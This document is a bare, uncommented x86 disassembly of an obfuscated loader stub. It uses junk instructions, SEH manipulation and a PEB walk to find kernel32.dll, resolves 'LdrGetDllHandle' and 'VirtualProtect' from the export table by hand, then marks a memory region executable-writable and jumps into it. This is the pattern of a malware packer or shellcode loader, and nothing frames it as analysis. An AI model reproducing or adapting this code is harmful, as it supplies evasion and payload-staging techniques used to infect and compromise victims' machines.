IlqUenn
pushad
call $+5
mov [ esp ] ecx
xor ecx [ esp ]
add esp 0x4
push esp
inc ecx
add esp 0x4
mov edi [ esp - 0x4 ]
or esi esi
adc ecx 0x1
sub edi 0x4
or ebx ebx
sbb ecx 0xffffffff
neg ecx
call $+5
sub [ edi ] ecx
retn
sub_1100303b
xor edi edi
xor ecx ecx
or ecx edi
dec cx
stc
sbb cl 0x0
mov ch cl
push edi
pop ebp
call $+5
add [ esp ] edi
jmp [ esp ]
and edi 0x0
or edi ebp
mov eax 0x0
add eax [ esp ]
inc ebp
movzx edx [ eax + ebp - 0x2 ]
sub esp 0x4
mov [ esp ] edx
sub edx ecx
pop edx
jne r-xdata
add [ eax ] al
add [ eax ] al
sub_110030b1
push [ fs : 0x0 ]
and esi esi
adc edx edi
sub esi esi
add esi 0xffff
not ebx
add edx edi
mov [ fs : 0x0 ] esp
and edx ebx
test ecx ecx
adc edx edi
and ebx ebx
jno r-xdata
call $+5
call sub_110030b1
add esp 0xfffffffc
mov [ esp ] ebx
mov ebx [ esp + 0x10 ]
inc [ ebx + 0xb8 ]
or edi edi
adc [ ebx + 0xb8 ] 0x1
pop ebx
xor eax eax
retn 0x10
pop ecx
or edx edx
mov ecx 0x0
adc ecx [ esp ]
mov [ fs : 0x0 ] ecx
or esi esi
adc esp 0x8
mov edi 0x0
add edi edx
and ecx 0x0
add ecx [ edx + 0x3c ]
add edx ecx
and ecx 0x0
or ecx 0x4550
mov eax 0x0
sub eax [ edx ]
neg eax
push eax
xor eax ecx
pop eax
jne r-xdata
jmp [ esp ]
popad
mov eax 0x1
retn 0xc
test ecx ecx
mov ecx 0x0
adc ecx [ edx + 0x78 ]
sub edx edx
add edx ecx
add edx edi
push edx
and ecx 0x0
or ecx [ edx + 0x20 ]
xor edx edx
add edx ecx
test edi edi
adc edx edi
add esp 0xfffffffc
mov [ esp ] edi
call $+5
mov [ esp ] edx
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call $+5
mov [ esp ] edx
xor edx [ esp ]
test edx edx
adc esp 0x4
push esi
pop eax
mov ecx 0x0
xor ecx [ esi ]
mov esi 0x0
sub esi ecx
neg esi
call $+5
test ecx ecx
mov ebp 0x0
adc ebp esp
add esi ebx
sub esp 0x4
mov [ esp ] 0x656c64
add esp 0xfffffffc
mov [ esp ] 0x6e61486c
add esp 0xfffffffc
mov [ esp ] 0x6c447465
call $+5
mov [ esp ] 0x4772644c
xor edi edi
xor edi esp
xor ecx ecx
xor ecx 0xb
[ esi ] [ edi ]
je r-xdata
sub edx edi
push ecx
xor ecx [ esp ]
sub esp 0xfffffffc
mov ecx [ edx ]
test ecx ecx
mov eax 0x0
adc eax 0x5a4d
and ecx esi
add esp 0xfffffffc
mov [ esp ] eax
sub eax ecx
pop eax
je r-xdata
mov esp 0x0
sub esp ebp
neg esp
pop esi
sub esp 0x4
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
mov ebx [ esp ]
add esp 0x4
mov edi [ esp ]
add esp 0x4
add esp 0x4
mov edx [ esp - 0x4 ]
mov esi edx
and ecx 0x0
or ecx [ edx + 0x24 ]
test eax eax
mov edx 0x0
adc edx ecx
add edx edi
and ecx 0x0
or ecx [ edx + ebx * 2 ]
and ecx 0xffff
sub ebx ebx
add ebx ecx
and ecx 0x0
add ecx [ esi + 0x10 ]
sub ebx ecx
or ebx ebx
adc ebx 0x1
and edx 0x0
or edx [ esi + 0x1c ]
add edx edi
xor ecx ecx
xor ecx [ edx + ebx * 4 ]
add edi ecx
xor ebp ebp
add ebp esp
add esp 0xfffffffc
mov [ esp ] ecx
xor ecx [ esp ]
sub esp 0xfffffffc
add esp 0xfffffffc
mov [ esp ] ecx
mov edx 0x0
xor edx esp
add esp 0xfffffffc
mov [ esp ] ecx
push 0x6c006c
push 0x64002e
add esp 0xfffffffc
mov [ esp ] 0x320033
sub esp 0x4
mov [ esp ] 0x6c0065
add esp 0xfffffffc
mov [ esp ] 0x6e0072
push 0x65006b
push esp
push 0x1a0018
mov eax 0x0
sub eax esp
neg eax
sub esp 0x4
mov [ esp ] edx
sub esp 0x4
mov [ esp ] eax
call $+5
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] edx
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
and eax 0x0
add eax [ esi ]
call $+5
mov [ esp ] eax
add esp 0x4
mov ecx [ esp - 0x4 ]
push [ fs : 0x30 ]
pop eax
and edx edx
mov edi 0x0
adc edi [ eax + 0x10 ]
mov [ edi + 0x18 ] ecx
sub esp esp
add esp ebp
mov eax 0x0
xor eax [ fs : 0x30 ]
mov edi 0x0
xor edi [ eax + 0x10 ]
sub edx edx
add edx [ edi + 0x18 ]
and edi 0x0
add edi edx
mov ecx 0x0
or ecx [ edx + 0x3c ]
add edx ecx
xor ecx ecx
add ecx [ edx + 0x78 ]
mov edx 0x0
xor edx ecx
test esi esi
adc edx edi
add esp 0xfffffffc
mov [ esp ] edx
mov ecx 0x0
sub ecx [ edx + 0x20 ]
neg ecx
mov edx 0x0
sub edx ecx
neg edx
and eax eax
adc edx edi
add esp 0xfffffffc
mov [ esp ] edi
push edx
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
and edx edx
sbb esp 0xfffffffc
xor eax eax
xor eax esi
and ecx 0x0
add ecx [ esi ]
xor esi esi
add esi ecx
call $+5
mov ebp 0x0
sub ebp esp
neg ebp
test eax eax
adc esi ebx
sub esp 0x4
mov [ esp ] 0x7463
call $+5
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
sub esp 0x4
mov [ esp ] 0x74726956
mov edi 0x0
or edi esp
mov ecx 0x0
sub ecx 0xf
neg ecx
[ esi ] [ edi ]
je r-xdata
and edi edi
adc edx 0x1
test ecx ecx
adc eax 0x4
sub esi esi
add esi [ eax ]
sub esp esp
add esp ebp
jmp [ esp ]
mov esp 0x0
add esp ebp
pop esi
push ebx
sub esp 0x4
mov [ esp ] edx
pop ebx
add esp 0x4
mov edi [ esp - 0x4 ]
mov edx [ esp ]
add esp 0x4
push edx
pop esi
mov ecx 0x0
sub ecx [ edx + 0x24 ]
neg ecx
xor edx edx
or edx ecx
test edx edx
adc edx edi
test ebx ebx
mov ecx 0x0
adc ecx [ edx + ebx * 2 ]
and ecx 0xffff
xor ebx ebx
xor ebx ecx
mov ecx 0x0
sub ecx [ esi + 0x10 ]
neg ecx
test ecx ecx
sbb ebx ecx
and eax eax
sbb ebx 0xffffffff
mov edx 0x0
xor edx [ esi + 0x1c ]
add edx edi
and ecx 0x0
or ecx [ edx + ebx * 4 ]
add edi ecx
push 0x1000
pop esi
call $+5
pop edx
and edx 0xfffff000
and eax eax
adc edx esi
test edi edi
adc edx esi
add esp 0xfffffffc
mov [ esp ] edx
mov eax 0x0
sub eax 0x4
neg eax
call $+5
or ebx ebx
adc edx esi
xor ecx ecx
xor ecx [ edx ]
and ebx ebx
sbb eax 0x1
je r-xdata
test eax eax
sbb edx 0xffffffff
and edi edi
adc eax 0x4
or edx edx
mov esi 0x0
adc esi [ eax ]
and esp 0x0
add esp ebp
jmp [ esp ]
mov ecx [ esp ]
add esp 0x4
add esp 0x4
mov edx [ esp - 0x4 ]
push ecx
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
add esp 0xfffffffc
mov [ esp ] 0x4abf
push edx
call $+5
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] edx
pop esi
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
add eax 0x19
add esp 0xfffffffc
mov [ esp ] eax
call $+5
mov [ esp ] ebp
mov ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
_start
jmp IlqUenn
